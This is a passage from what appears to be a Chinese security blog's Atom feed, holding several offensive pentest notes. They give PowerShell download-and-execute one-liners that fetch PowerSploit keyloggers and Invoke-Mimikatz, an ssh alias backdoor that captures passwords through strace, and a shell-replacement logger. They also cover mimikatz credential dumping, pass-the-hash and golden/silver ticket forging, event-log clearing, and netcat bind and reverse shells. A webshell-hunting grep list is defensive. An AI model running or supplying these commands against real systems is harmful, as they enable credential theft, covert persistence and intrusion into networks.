&lt;pre&gt;&lt;code&gt;powershell IEX (New-Object Net.WebClient).DownloadString(&amp;apos;https://raw.github
      
    
    </summary>
    
      <category term="骚操作" scheme="http://yoursite.com/categories/%E9%AA%9A%E6%93%8D%E4%BD%9C/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux查找webshell</title>
    <link href="http://yoursite.com/2018/12/05/Linux%E6%9F%A5%E6%89%BEwebshell/"/>
    <id>http://yoursite.com/2018/12/05/Linux查找webshell/</id>
    <published>2018-12-05T12:38:16.000Z</published>
    <updated>2018-12-05T12:44:09.033Z</updated>
    
    <content type="html"><![CDATA[<p>在网站目录差找如下关键字：</p><pre><code>grep -Rn &quot;shell_exec *(&quot; /var/wwwgrep -Rn &quot;base64_decode *(&quot; /var/wwwgrep -Rn &quot;phpinfo *(&quot; /var/wwwgrep -Rn &quot;system *(&quot; /var/wwwgrep -Rn &quot;php_uname *(&quot; /var/wwwgrep -Rn &quot;chmod *(&quot; /var/wwwgrep -Rn &quot;fopen *(&quot; /var/wwwgrep -Rn &quot;fclose *(&quot; /var/wwwgrep -Rn &quot;readfile *(&quot; /var/wwwgrep -Rn &quot;edoced_46esab *(&quot; /var/wwwgrep -Rn &quot;eval *(&quot; /var/wwwgrep -Rn &quot;pwd&quot; /var/wwwgrep -Rn &quot;pass&quot; /var/wwwgrep -Rn &quot;pw&quot; /var/wwwgrep -Rn 密码&quot; /var/www</code></pre><blockquote><p>grep -rn：忽略大小写</p></blockquote><p>find:</p><pre><code>find /www/ -name &quot;*.php&quot; |xargs egrep &apos;assert|phpspy|c99sh|milw0rm|eval|\(gunerpress|\(base64_decoolcode|spider_bc|shell_exec|passthru|\(\$\_\POST\[|eval \(str_rot13|\.chr\(|\$\{\&quot;\_P|eval\(\$\_R|file_put_contents\(\.\*\$\_|base64_decode&apos;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在网站目录差找如下关键字：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;grep -Rn &amp;quot;shell_exec *(&amp;quot; /var/www

grep -Rn &amp;quot;base64_decode *(&amp;quot; /var/www

grep -Rn &amp;quot;
      
    
    </summary>
    
      <category term="shell" scheme="http://yoursite.com/categories/shell/"/>
    
    
  </entry>
  
  <entry>
    <title>命令行下的信息收集</title>
    <link href="http://yoursite.com/2018/12/05/%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://yoursite.com/2018/12/05/命令行下的信息收集/</id>
    <published>2018-12-05T12:16:29.000Z</published>
    <updated>2018-12-06T09:04:58.734Z</updated>
    
    <content type="html"><![CDATA[<p>域用户信息</p><pre><code>whoami /user 查看当前用户的用户名和sidwhoami /groups 查看当前用户所属的用户组whoami /priv 查看当前用户的权限</code></pre><p>用户及用户组信息    </p><pre><code>net group /domain 查看域中的用户组net group &quot;domain admins&quot; /domain 获得域管理员列表net group &quot;domain controllers&quot; /domain 获得域控制器列表net group &quot;domain computers&quot; /domain 获得所有域成员计算机列表net user /domain 查看域中的用户net accounts /domain 获得域密码策略、密码长短等信息。net view /domain 查看所有域或工作组</code></pre><p>离线凭证收集-提取域用户hash</p><p>域用户hash存储在ntds.dit里。他的位置一般在域控上<code>%WINDIR%\ntds\ntds.dit</code></p><p>使用wmic识别安装到系统中的补丁情况</p><pre><code>wmic qfe get description,installedOn</code></pre><p>识别正在运行的服务</p><pre><code>sc query type= service或net start</code></pre><p>识别开机启动的程序，包括路径</p><pre><code>wmic startup list full</code></pre><p>ping探测存活主机</p><pre><code>for /L %I in (100,1,254) DO @ping -w 1 -n 1 10.18.180.%I | findstr &quot;TTL=&quot; &gt;&gt; ping.txt</code></pre><p>查看系统中网卡的IP地址和MAC地址</p><pre><code>wmic nicconfig get ipaddress,macaddress</code></pre><p>查看当前系统是否有屏保保护，延迟是多少</p><pre><code>wmic desktop get screensaversecure,screensavertimeout</code></pre><p>查看系统中开放的共享</p><pre><code>wmic share get name,path或net share</code></pre><p>查看系统中开启的日志</p><pre><code>wmic nteventlog get path,filename,writeable</code></pre><p>清除相关的日志（这里是全部清除）</p><pre><code>wevtutil cl &quot;windows powershell&quot;wevtutil cl &quot;security&quot;wevtutil cl &quot;system&quot;</code></pre><p>查看系统中安装的软件以及版本</p><pre><code>wmic product get name,version</code></pre><p>查看某个进程的详细信息 （路径，命令行参数等）</p><pre><code>wmic process where name=&quot;chrome.exe&quot; list full</code></pre><p>终止一个进程</p><pre><code>wmic process where name=&quot;xshell.exe&quot; call terminatentsd -c q -p 进程的PID</code></pre><p>显示系统中的曾经连接过的无线密码</p><pre><code>netsh wlan show profiles netsh wlan show profiles name=&quot;profiles的名字&quot; key=clear</code></pre><p>查看当前系统是否是VMWARE</p><pre><code>wmic bios list full | find /i &quot;vmware&quot;</code></pre><p>可以用<code>wmic /?</code>查看具体用法</p><ul><li><code>Process</code> -进程信息</li><li><code>Service</code> -服务</li><li><code>Share</code> -共享</li><li><code>DataFile</code> -文件及目录</li><li><code>Volume</code> -磁盘卷列表</li></ul><h2 id="一些收集工具"><a href="#一些收集工具" class="headerlink" title="一些收集工具"></a>一些收集工具</h2><h3 id="setspn-exe"><a href="#setspn-exe" class="headerlink" title="setspn.exe"></a>setspn.exe</h3><p>Setspn是一款管理spn的命令行软件。我们可以用它来查看某台主机或账户的SPN。</p><p>查看账户college的SPN</p><pre><code>Setspn -L college</code></pre><p>查看当前域中的所有SPN</p><pre><code>Setspn -T * -Q */*</code></pre><h3 id="ADFind-exe"><a href="#ADFind-exe" class="headerlink" title="ADFind.exe"></a>ADFind.exe</h3><p>Adfind是一款活动目录查询工具。</p><p><a href="http://www.joeware.net/freetools/tools/adfind/" target="_blank" rel="noopener">http://www.joeware.net/freetools/tools/adfind/</a></p><p>列出域控列表</p><pre><code>Adfind.exe -sc dclist</code></pre><p>查询域中活动的主机，输出主机名和域名</p><pre><code>Adfind.exe -sc computers_active name dnshostname </code></pre><p>获取域内主机信息</p><pre><code>AdFind.exe -b dc=school,dc=com -f &quot;objectcategory=computer&quot;</code></pre><p>查询域中主机的spn</p><pre><code>AdFind.exe -b cn=computers,dc=school,dc=com servicePrincipalName</code></pre><h3 id="Netview-exe"><a href="#Netview-exe" class="headerlink" title="Netview.exe"></a>Netview.exe</h3><p>Netview 能够收集域内主机共享、IP、是否为域控等信息。</p><p><a href="https://github.com/mubix/netview" target="_blank" rel="noopener">https://github.com/mubix/netview</a></p><p>将主机名（或IP地址）列表保存在文件host.txt中，使用<code>netview -f host.txt</code>来信息收集。</p><h3 id="Netsses-exe"><a href="#Netsses-exe" class="headerlink" title="Netsses.exe"></a>Netsses.exe</h3><p>工具能够列举目标主机上的NetBIOS session，通常不依赖于管理员权限（-full参数列出所有会话需要管理权限）。</p><p><a href="http://www.joeware.net/freetools/tools/netsess/index.htm" target="_blank" rel="noopener">http://www.joeware.net/freetools/tools/netsess/index.htm</a></p><p>如果有一台域成员（192.168.1.128）机器<code>net view</code>了本机的共享（192.168.1.130），那么它与本机之间会存在一个netbios会话，可以使用下列命令来查看会话用户：</p><pre><code>netsess-h 192.168.1.130-c\\192.168.1.128</code></pre><p>这里的<code>-h</code>参数指定了服务器的地址，<code>-c</code>参数则指定了客户端的地址</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;域用户信息&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;whoami /user 查看当前用户的用户名和sid
whoami /groups 查看当前用户所属的用户组
whoami /priv 查看当前用户的权限
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;用户及用户组信息    &lt;/p&gt;
&lt;pre
      
    
    </summary>
    
      <category term="信息收集" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
  </entry>
  
  <entry>
    <title>密码记录工具</title>
    <link href="http://yoursite.com/2018/12/05/%E5%AF%86%E7%A0%81%E8%AE%B0%E5%BD%95%E5%B7%A5%E5%85%B7/"/>
    <id>http://yoursite.com/2018/12/05/密码记录工具/</id>
    <published>2018-12-05T08:15:02.000Z</published>
    <updated>2018-12-05T11:40:10.277Z</updated>
    
    <content type="html"><![CDATA[<p>在渗透测试过程当中，我们往往需要获取到一个合法用户的凭证。有时候，通常使用的一些密码抓取工具（如mimikatz、wce等）可能会由于各种原因失效（例如杀软或者权限的问题），这时候我们如果想获取凭证，可以通过键盘记录等方式来得到密码。这种方式需要目标用户交互，比较看运气。</p><h1 id="Windows-Powershell"><a href="#Windows-Powershell" class="headerlink" title="Windows Powershell"></a>Windows Powershell</h1><pre><code>powershell -ep bypassiex (new-object net.webclient).downloadstring(&apos;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-Keystrokes.ps1&apos;); Get-Keystrokes -Logpath C:\log.txt</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxvyc3cbrnj30dm08vq4m.jpg" alt=""></p><h1 id="Get-Keystrokes-ps1"><a href="#Get-Keystrokes-ps1" class="headerlink" title="Get-Keystrokes.ps1"></a>Get-Keystrokes.ps1</h1><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Exfiltration/Get-Keystrokes.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Exfiltration/Get-Keystrokes.ps1</a></p><p>远程下载执行：</p><pre><code>powershell -ep bypassiex (new-object net.webclient).downloadstring(&apos;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-Keystrokes.ps1&apos;); Get-Keystrokes -Logpath C:\log.txt</code></pre><h1 id="Invoke-CredentialsPhish-ps1"><a href="#Invoke-CredentialsPhish-ps1" class="headerlink" title="Invoke-CredentialsPhish.ps1"></a>Invoke-CredentialsPhish.ps1</h1><p>Invoke-CredentialsPhish是nishang中的一个钓鱼工具，它能在目标桌面上弹出一个认证窗口。<br>不管是点击关闭，确定，还是取消，这个窗口都会反复弹出，除非用户输入正确的密码或是直接kill掉powershell进程。</p><pre><code>powershell -ep bypassiex (new-object net.webclient).downloadstring(&apos;https://github.com/PowerShellMafia/PowerSploit/blob/dev/Exfiltration/Get-Keystrokes.ps1&apos;); Get-Keystrokes -Logpath C:\log.txt</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxvz7vsiiqj309p08mdgp.jpg" alt=""></p><h1 id="Openssh后门"><a href="#Openssh后门" class="headerlink" title="Openssh后门"></a>Openssh后门</h1><h1 id="Linux-alias"><a href="#Linux-alias" class="headerlink" title="Linux alias"></a>Linux alias</h1><p>在~/.bashrc下添加如下一行：</p><pre><code>alias ssh=&apos;strace -o /var/tmp/.syscache-`date +&apos;%Y-%m-%d+%H:%m:%S&apos;`.log -s 4096 ssh&apos;</code></pre><p>再使更改生效：</p><pre><code>source ~/.bashrcapt-get install strace        //若缺少此软件，需要安装</code></pre><p>当有用户使用ssh命令时，会生成一个Log文件：</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxw0qzzxsqj30ke0dk0v6.jpg" alt=""></p><p>但是内容有点多，需要筛选一下：</p><pre><code>cat .syscache-2018-11-20+14\:11\:54.log  | grep  &quot;read(4&quot;</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxw0r8uoz1j30k20bgq45.jpg" alt=""></p><h1 id="sh2log"><a href="#sh2log" class="headerlink" title="sh2log"></a>sh2log</h1><p>ubuntu下载sh2log：</p><pre><code>wget http://packetstorm.foofus.com/UNIX/loggers/sh2log-1.0.tgz</code></pre><p>解压压缩包：</p><pre><code>tar –xvf sh2log-1.0.tgz</code></pre><p>Cd进入sh2log-1.0文件夹 安装libx11-dev</p><pre><code>sudo apt-get install libxll-dev</code></pre><p>安装完成后，编译sh2log：</p><p>输入make linux</p><p>新建一个shell脚本，脚本内容如下：</p><pre><code>sudo mkdir /bin/shells/sudo cp -p /bin/{sh,bash} /bin/shells/sudo rm -f /bin/{sh,bash}sudo cp -p sh2log /bin/bashsudo cp -p sh2log /bin/sh ./sh2logd</code></pre><p>保存脚本，添加执行权限：</p><pre><code>chmod +x  ./1.sh</code></pre><p>运行脚本：</p><pre><code>./1.sh</code></pre><p>启动后，可以用<code>ps -ef|grep sh2logd</code>来检查是否成功启动，它会在安装目录下生成一个bin文件</p><p>查看的话可以用parser这个工具查看：<code>./parser xxxxx.bin</code></p><p>输入bash，打开一个新的she11，随意输入一些命令 之后使用文件夹中的parser工具，</p><pre><code>./parser sh2log-xxxxx.bin</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在渗透测试过程当中，我们往往需要获取到一个合法用户的凭证。有时候，通常使用的一些密码抓取工具（如mimikatz、wce等）可能会由于各种原因失效（例如杀软或者权限的问题），这时候我们如果想获取凭证，可以通过键盘记录等方式来得到密码。这种方式需要目标用户交互，比较看运气。&lt;
      
    
    </summary>
    
      <category term="内网渗透工具" scheme="http://yoursite.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    
    
  </entry>
  
  <entry>
    <title>密码提取神器--mimikatz</title>
    <link href="http://yoursite.com/2018/12/05/%E5%AF%86%E7%A0%81%E6%8F%90%E5%8F%96%E7%A5%9E%E5%99%A8-mimikatz/"/>
    <id>http://yoursite.com/2018/12/05/密码提取神器-mimikatz/</id>
    <published>2018-12-05T06:57:03.000Z</published>
    <updated>2018-12-06T13:42:22.766Z</updated>
    
    <content type="html"><![CDATA[<h2 id="mimikatz抓取用户密码"><a href="#mimikatz抓取用户密码" class="headerlink" title="mimikatz抓取用户密码"></a>mimikatz抓取用户密码</h2><p><a href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.1.1-20181203" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/releases/tag/2.1.1-20181203</a></p><p>mimikatz是由C语言编写的开源小工具，于2014年4月发起。它的功能非常强大，支持从Windows系统内存中提取明文密码、哈希、PIN码和Kerberos凭证，以及pass-the-hash、pass-the-ticket、build Golden tickets等数种黑客技术。</p><p>mimikatz使用起来也非常简单，提取Windows系统的明文密码只需两行命令：</p><pre><code>privilege::debug #提升权限sekurlsa::logonpasswords #抓取密码</code></pre><blockquote><p>输入aaa::aaa，可展示所有模块</p></blockquote><p>可采用log命令，保存为日志</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxvwgt2walj30wh0hhmy1.jpg" alt=""></p><blockquote><p>要以管理员身份进入mimikatz</p></blockquote><p>用cmd5去爆破NTML值</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxvwi10mj0j30kk099dfw.jpg" alt=""></p><p>要钱，算了….</p><p>修改注册表，启用摘要密码支持</p><p>需要创建UseLogonCredential，并赋值为1</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxvwtjmhb7j30hf0eb0tf.jpg" alt=""></p><p>重新登录后，再次运行就可以抓取到明文密码啦。</p><h2 id="mimikatz令牌窃取"><a href="#mimikatz令牌窃取" class="headerlink" title="mimikatz令牌窃取"></a>mimikatz令牌窃取</h2><p>Windows有两种类型的Token：</p><ul><li>Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)</li><li>Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)</li></ul><blockquote><p>两种token只在系统重启后清除</p></blockquote><blockquote><p>具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效</p></blockquote><h3 id="使用mimikatz的token模块中的命令列出token，模仿system用户token，最后恢复到原来的token"><a href="#使用mimikatz的token模块中的命令列出token，模仿system用户token，最后恢复到原来的token" class="headerlink" title="使用mimikatz的token模块中的命令列出token，模仿system用户token，最后恢复到原来的token"></a>使用mimikatz的token模块中的命令列出token，模仿system用户token，最后恢复到原来的token</h3><p>以管理员身份运行mimikatz——&gt;使用<code>privilege::debug</code>获取debug权限——&gt;使用<code>token::elevate</code>模仿system用户的令牌——&gt;使用<code>token::list</code>列出令牌——&gt;使用 <code>lsadump::sam</code>来获取sam数据库中的密码——&gt;使用<code>token::revert</code>恢复令牌</p><h2 id="Mimikatz后渗透"><a href="#Mimikatz后渗透" class="headerlink" title="Mimikatz后渗透"></a>Mimikatz后渗透</h2><p>在kerberos认证中，如果需要向某个服务发起认证，首先需要获取到TGT，之后拿着这张TGT去获得ST。微软的kerberos认证支持rc4加密，它会使用服务器的ntlm hash作为加密票据的密钥。那么当获取到ST后，就能尝试暴力破解服务器的密码hash。</p><h3 id="Pass-The-Hash"><a href="#Pass-The-Hash" class="headerlink" title="Pass-The-Hash"></a>Pass-The-Hash</h3><pre><code>sekurlsa::pth /domain:GUOXIANG.com /user:administrator /ntlm 保存的hash</code></pre><h3 id="Pass-The-Ticket"><a href="#Pass-The-Ticket" class="headerlink" title="Pass-The-Ticket"></a>Pass-The-Ticket</h3><p>查看当前用户的ticket</p><pre><code>Kerberos::list</code></pre><p>导出当前用户的ticket</p><pre><code>Kerberos::list /export</code></pre><p>查看所有ticket</p><pre><code>Sekurlsa::tickets</code></pre><p>导出所有ticket</p><pre><code>Sekurlsa::tickets /export</code></pre><p>获得需要的票据后，可以在其他机器上导入此票据：</p><pre><code>Kerberos:ptt 票据名</code></pre><p>导入不依赖管理员权限，比较方便。假设导入了域管的票据，则我们可以dir域控的c$共享：<code>Dir\\DC\c$</code>来进行测试。</p><p>需要注意的是UNC路径中需要使用主机名DC，而不能使用172.17.1.1这样的ip地址，否则可能会被拒绝访问。</p><h2 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden Ticket"></a>Golden Ticket</h2><p>黄金票据（golden ticket）是一种为任意用户生成TGT票据的方法。只要获取<strong>kribtgt账户的密码HASH</strong>、<strong>域sid</strong>、<strong>域名</strong>和<strong>域账户</strong>，黄金票据即可离线生成，而且不受TGT生命周期的影响（默认10小时，最多续订7天）</p><h3 id="kribtgt账户的密码HASH"><a href="#kribtgt账户的密码HASH" class="headerlink" title="kribtgt账户的密码HASH"></a>kribtgt账户的密码HASH</h3><p>kribtgt账户的密码hash存储在域控制器上，因此需要获得域管理员权限。</p><p>获取krbtgt的hash：</p><pre><code>lsadump::dcsync /domain:GUOXIANG.com /user:krbtgt</code></pre><p>我们可以使用<code>aes256_hmac</code>这一行的hash。</p><h3 id="域sid"><a href="#域sid" class="headerlink" title="域sid"></a>域sid</h3><p>域的sid可以使用工具<strong>psgetsid</strong>获取，也可以在获取域成员shell后使用<code>whoami /user</code>获取。例如域用户sid为<code>S-1-5-21-3187487621-2881332574-933047120-1105</code>，则1105之前的就是域sid</p><h3 id="生成黄金票据"><a href="#生成黄金票据" class="headerlink" title="生成黄金票据"></a>生成黄金票据</h3><p>获取到上述信息后，就可以使用mimikatz的<code>kerberos::golden</code>生成黄金票据</p><pre><code>Kerberos::golden /user：guoxiang /sid:域sid /aes256:krbtgt账户aes256加密的hash /domain:GUOXIANG.com /ticket:golden.kirbi</code></pre><p>当需要使用黄金票据的时候，使用mimikatz：</p><pre><code>Kerberos:ptt golden.kribi</code></pre><h2 id="Silver-Ticket"><a href="#Silver-Ticket" class="headerlink" title="Silver Ticket"></a>Silver Ticket</h2><p>黄金票据伪造的是TGT，而白银票据则伪造ST。</p><p>由于ST针对特定的服务，因此白银票据只能用来<strong>认证特定服务</strong>，而黄金票据则可以用于<strong>认证任何kerberos服务</strong>。</p><p>使用白银票据并不需要和域控通信（使用ST直接和目标服务器通信），而使用黄金票据则需要与域控通信（需要使用伪造的TGT来获取ST）</p><h3 id="生成白银票据"><a href="#生成白银票据" class="headerlink" title="生成白银票据"></a>生成白银票据</h3><p>生成白银票据需要：</p><ul><li>域名</li><li>sid</li><li>用户名：可以是任意用户</li><li>服务名：如cifs、ldap等</li><li>目标计算机账户密码hash（<strong>这里需要win-xxxxxx$这类账户的ntlm hash，否则会导致认证失败</strong>）</li></ul><p>获取到上述信息后：</p><pre><code>kerberos::golden /admin:guoxiang /domain:GUOXIANG.com /id:1105 /sid:S-1-5-21-2236738896-1661306322-1924668396 target:guoxiang.GUOXIANG.com /rc4:35493c328494b75aff81d2ffcf173787 /service:LDAP /ptt</code></pre><p>到处白银票据。</p><p>Mimikatz中的<strong>dcsync</strong>通过<strong>drsr  协议</strong>向域控发起复制用户凭证的请求。使用这种方式，无需登录到域控上，只通过网络就能够获取用户的凭证。前面讲解的黄金和白银票据可以实现对域控的持久访问，配合dcsync即可在域成员主机上提取凭证。</p><h2 id="Powershell版的Mimikatz"><a href="#Powershell版的Mimikatz" class="headerlink" title="Powershell版的Mimikatz"></a>Powershell版的Mimikatz</h2><p>一句话执行：</p><pre><code>powershell Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command &apos;&quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords full&quot;&apos;</code></pre><p>无文件执行：</p><pre><code>powershell Iex (new-object net.webclient).downloadstring(‘https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1’);Invoke-Mimikatz -Command &apos;&quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords full&quot;&apos;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;mimikatz抓取用户密码&quot;&gt;&lt;a href=&quot;#mimikatz抓取用户密码&quot; class=&quot;headerlink&quot; title=&quot;mimikatz抓取用户密码&quot;&gt;&lt;/a&gt;mimikatz抓取用户密码&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://githu
      
    
    </summary>
    
      <category term="内网渗透工具" scheme="http://yoursite.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    
    
  </entry>
  
  <entry>
    <title>nc命令使用</title>
    <link href="http://yoursite.com/2018/12/04/nc%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/"/>
    <id>http://yoursite.com/2018/12/04/nc命令使用/</id>
    <published>2018-12-04T15:07:24.000Z</published>
    <updated>2018-12-04T15:12:54.197Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Netcat-nc"><a href="#Netcat-nc" class="headerlink" title="Netcat(nc):"></a>Netcat(nc):</h1><p>NC（netcat）被称为网络工具中的瑞士军刀，体积小巧，但功能强大。</p><p>Nc可以在两台设备上面相互交互，即侦听模式/传输模式</p><ul><li>Telnet功能</li><li>获取banner信息</li><li>传输文本信息</li><li>传输文件/目录</li><li>加密传输文件，默认不加密</li><li>远程控制</li><li>加密所有流量</li><li>流媒体服务器</li><li>远程克隆硬盘</li></ul><h2 id="常用参数："><a href="#常用参数：" class="headerlink" title="常用参数："></a>常用参数：</h2><ul><li>-n 以数字形式表示的IP地址</li><li>-v 显示详细信息 [使用=vv获取更详细的信息</li><li>-l 监听入站信息</li><li>-p port 本地端口</li><li>-q secs 在标准输入且延迟后退出</li><li>-c shell commands shell模式</li><li>-u UDP模式</li><li>-s addr 本地源地址</li><li>-h 获取帮助信息</li><li>-z I/O 模式 [扫描时使用]</li></ul><h2 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h2><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><pre><code>A:nc -lp port -c bashB:nc ip port</code></pre><p>A将自己的Bash发给B</p><h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><pre><code>A:nc -lp portB:nc ip port -c bash</code></pre><p>B将自己的Bash发给A</p><blockquote><p>win下Bash换成cmd</p></blockquote><p>通常反向连接 比较常用，因为防火墙的存在，让目标机主动发送shell</p><h2 id="使用NC进行信息收集"><a href="#使用NC进行信息收集" class="headerlink" title="使用NC进行信息收集"></a>使用NC进行信息收集</h2><h3 id="简单的建立连接，就是侦听模式和传输模式"><a href="#简单的建立连接，就是侦听模式和传输模式" class="headerlink" title="简单的建立连接，就是侦听模式和传输模式"></a>简单的建立连接，就是侦听模式和传输模式</h3><ul><li>nc -lp port  监听指定端口号</li><li>nc -nv ip port  连接对方tcp端口，默认情况下，双方可以发送文本信息</li></ul><h3 id="收集目标机上的进程信息"><a href="#收集目标机上的进程信息" class="headerlink" title="收集目标机上的进程信息"></a>收集目标机上的进程信息</h3><ul><li>nc -l -p 4444 &gt;wing.txt 将远程发送过来的内容保存在本地</li><li>Ps aux |nc -nv ip port -q 1  标准输入完成后delay一秒钟，会发送到侦听端</li></ul><h2 id="NC传输文件-目录"><a href="#NC传输文件-目录" class="headerlink" title="NC传输文件/目录"></a>NC传输文件/目录</h2><ul><li>nc -lp 4444 &gt;1.txt 1.txt就是你要保存的文件名 自定义</li><li>nc -nv ip port &lt;1.txt -q 1 将文件发送给侦听端<blockquote><p>侦听端的文件名最好按照文件本身来命名</p></blockquote></li></ul><p><strong>将目录打包：</strong></p><p>tar -cvf - 目录名/|nc -lp port -q 1</p><p><strong>将目录解包</strong></p><p>nc -nv ip port |tar -xvf -</p><p><strong>NC端口扫描</strong></p><p>nc -nvz ip 1-65535</p><h2 id="NC文件加密传输"><a href="#NC文件加密传输" class="headerlink" title="NC文件加密传输"></a>NC文件加密传输</h2><pre><code>apt-get install mcryptA： nc -lp port|mcrypt - -flush -Fbqd -a rijndael-256 -m ecb &gt;文件名B：mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt;文件名|nc -nv ip port -q 1</code></pre><p>B将文件加密发送，A接受后先解密再保存到本地，B在1s后退出。<br>主要是利用mcrypt进行加密</p><h2 id="NC端口扫描"><a href="#NC端口扫描" class="headerlink" title="NC端口扫描"></a>NC端口扫描</h2><p>nc -nvz ip 1-65535</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxv4a6vt6pj30kn0hc406.jpg" alt=""></p><p>默认使用tcp进行扫描</p><h2 id="NC复制磁盘"><a href="#NC复制磁盘" class="headerlink" title="NC复制磁盘"></a>NC复制磁盘</h2><pre><code>A:nc -lp port |dd of=/dev/sdaB: dd if=/dev/sda | nc -nc ip port -q 1</code></pre><ul><li>If是input filter</li><li>Of 是output filter</li></ul><p>B将数据复制到A挂载的硬盘上</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Netcat-nc&quot;&gt;&lt;a href=&quot;#Netcat-nc&quot; class=&quot;headerlink&quot; title=&quot;Netcat(nc):&quot;&gt;&lt;/a&gt;Netcat(nc):&lt;/h1&gt;&lt;p&gt;NC（netcat）被称为网络工具中的瑞士军刀，体积小巧，但功能强大。&lt;/p
      
    
    </summary>
    
      <category term="命令使用" scheme="http://yoursite.com/categories/%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>常见的漏洞端口</title>
    <link href="http://yoursite.com/2018/12/04/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%AB%AF%E5%8F%A3/"/>
    <id>http://yoursite.com/2018/12/04/常见的漏洞端口/</id>
    <published>2018-12-04T07:48:29.000Z</published>
    <updated>2018-12-12T09:15:44.733Z</updated>
    
    <content type="html"><![CDATA[<p><strong>21</strong> ftp 主要看是否支持匿名，也可以跑弱口令</p><p><strong>22</strong> ssh SSH远程登录协议</p><p><strong>23</strong> telnet telnet终端仿真协议</p><p><strong>80</strong> web 常见web漏洞以及是否为一些管理后台</p><p><strong>389</strong> LDAP（轻量目录访问协议）存在匿名访问</p><p><strong>443</strong> openssl 心脏滴血以及一些web漏洞测试</p><p><strong>873</strong> rsync 主要看是否支持匿名，也可以跑弱口令</p><p><strong>1099</strong>  JAVArmi  命令执行</p><p><strong>1433</strong> SQl server</p><p><strong>1521</strong>  Oracle   弱口令</p><p><strong>3306</strong> MySQL 能够外联数据库</p><p><strong>3389</strong> RDP 远程桌面看看能不能弱口令</p><p><strong>5432</strong>        PostGreSQL       弱口令爆破</p><p><strong>6379</strong> redis 一般无认证，可直接访问</p><p><strong>7001，7002</strong>  weblogic的console口</p><p><strong>8080</strong>  Tomcat\Jboss     弱口令，Jboss匿名访问</p><p><strong>8080-8090</strong>   常见Web端口</p><p><strong>9000</strong> fast-cgi对外可以getshell</p><p><strong>9043</strong>        WebSphere        弱口令爆破</p><p><strong>27017</strong>    MongoDB          未授权访问</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;21&lt;/strong&gt; ftp 主要看是否支持匿名，也可以跑弱口令&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;22&lt;/strong&gt; ssh SSH远程登录协议&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;23&lt;/strong&gt; telnet telnet终端仿真协议&lt;/p&gt;
&lt;p&gt;
      
    
    </summary>
    
      <category term="信息收集" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
  </entry>
  
  <entry>
    <title>反弹shell的几种姿势</title>
    <link href="http://yoursite.com/2018/12/04/%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF/"/>
    <id>http://yoursite.com/2018/12/04/反弹shell的几种姿势/</id>
    <published>2018-12-04T03:01:26.000Z</published>
    <updated>2018-12-04T15:07:40.156Z</updated>
    
